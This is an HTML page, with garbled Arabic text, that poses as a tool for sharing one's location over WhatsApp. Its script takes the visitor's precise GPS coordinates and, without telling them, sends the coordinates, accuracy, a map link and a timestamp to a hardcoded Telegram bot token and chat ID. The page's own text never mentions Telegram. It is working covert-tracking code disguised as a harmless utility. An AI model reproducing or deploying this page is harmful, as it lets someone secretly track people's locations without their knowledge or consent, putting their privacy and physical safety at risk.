<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Ø¬Ø§Ø±ÙŠ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-align: center;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background: rgba(255,255,255,0.1);
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        button {
            background: #25D366;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 25px;
            cursor: pointer;
            margin: 10px;
            width: 90%;
        }
        button:hover {
            background: #128C7E;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container" id="mainScreen">
        <h2>ğŸ“ Ù…Ø´Ø§Ø±ÙƒØ© Ø§Ù„Ù…ÙˆÙ‚Ø¹</h2>
        <p>Ø§Ù†Ù‚Ø± Ù„ØªØ­Ø¯ÙŠØ¯ Ù…ÙˆÙ‚Ø¹Ùƒ ÙˆÙ…Ø´Ø§Ø±ÙƒØªÙ‡ Ø¹Ø¨Ø± ÙˆØ§ØªØ³Ø§Ø¨</p>
        <button onclick="getLocation()">Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…ÙˆÙ‚Ø¹ÙŠ</button>
    </div>

    <div class="container hidden" id="resultScreen">
        <h2>âœ… ØªÙ… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹</h2>
        <p id="locationInfo"></p>
        <button onclick="openWhatsApp()">Ù…Ø´Ø§Ø±ÙƒØ© Ø¹Ø¨Ø± ÙˆØ§ØªØ³Ø§Ø¨</button>
        <button onclick="copyLocation()">Ù†Ø³Ø® Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª</button>
        <button onclick="showMap()">Ø¹Ø±Ø¶ Ø§Ù„Ø®Ø±ÙŠØ·Ø©</button>
    </div>

    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";
        
        let userLocation = null;

        function getLocation() {
            if (!navigator.geolocation) {
                alert("âŒ Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹");
                return;
            }

            document.getElementById('mainScreen').classList.add('hidden');
            document.getElementById('resultScreen').classList.remove('hidden');
            document.getElementById('locationInfo').innerHTML = "â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹...";

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    userLocation = { lat, lng, accuracy };
                    
                    document.getElementById('locationInfo').innerHTML = 
                        `ğŸ“ Ù…ÙˆÙ‚Ø¹Ùƒ Ø§Ù„Ø¯Ù‚ÙŠÙ‚:<br>
                         â€¢ Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: <b>${lat.toFixed(6)}</b><br>
                         â€¢ Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: <b>${lng.toFixed(6)}</b><br>
                         â€¢ Ø§Ù„Ø¯Ù‚Ø©: <b>${accuracy} Ù…ØªØ±</b>`;
                    
                    // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹
                    sendToTelegram(lat, lng, accuracy);
                },
                function(error) {
                    document.getElementById('locationInfo').innerHTML = 
                        "âŒ Ù„Ù… ØªØªÙ… Ø§Ù„Ø¥Ø°Ù† Ø¨Ù…Ø´Ø§Ø±ÙƒØ© Ø§Ù„Ù…ÙˆÙ‚Ø¹";
                    console.log("Error:", error);
                },
                { 
                    enableHighAccuracy: true, 
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }

        function openWhatsApp() {
            if (!userLocation) return;
            
            const message = `ğŸ“ Ù…ÙˆÙ‚Ø¹ÙŠ Ø§Ù„Ø­Ø§Ù„ÙŠ:\nhttps://maps.google.com/?q=${userLocation.lat},${userLocation.lng}`;
            const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(message)}`;
            
            // ÙØªØ­ ÙˆØ§ØªØ³Ø§Ø¨ ÙÙŠ Ù†Ø§ÙØ°Ø© Ø¬Ø¯ÙŠØ¯Ø©
            window.open(whatsappUrl, '_blank', 'width=600,height=700');
        }

        function copyLocation() {
            if (!userLocation) return;
            
            const text = `${userLocation.lat}, ${userLocation.lng}`;
            navigator.clipboard.writeText(text).then(() => {
                alert("âœ… ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª: " + text);
            });
        }

        function showMap() {
            if (!userLocation) return;
            
            const mapUrl = `https://maps.google.com/?q=${userLocation.lat},${userLocation.lng}`;
            window.open(mapUrl, '_blank', 'width=800,height=600');
        }

        async function sendToTelegram(lat, lng, accuracy) {
            const message = 
                `ğŸ¯ Ù…ÙˆÙ‚Ø¹ Ø¬Ø¯ÙŠØ¯\n\n` +
                `ğŸ“ Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª:\n` +
                `â€¢ Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${lat.toFixed(6)}\n` +
                `â€¢ Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: ${lng.toFixed(6)}\n` +
                `â€¢ Ø§Ù„Ø¯Ù‚Ø©: ${accuracy} Ù…ØªØ±\n\n` +
                `ğŸ—ºï¸ Ø§Ù„Ø®Ø±ÙŠØ·Ø©:\n` +
                `https://maps.google.com/?q=${lat},${lng}\n\n` +
                `ğŸ•’ Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString('ar-MA')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: message 
                    })
                });
                
                if (response.ok) {
                    console.log("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…");
                }
            } catch (error) {
                console.log("âŒ Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…:", error);
            }
        }
    </script>
</body>
</html>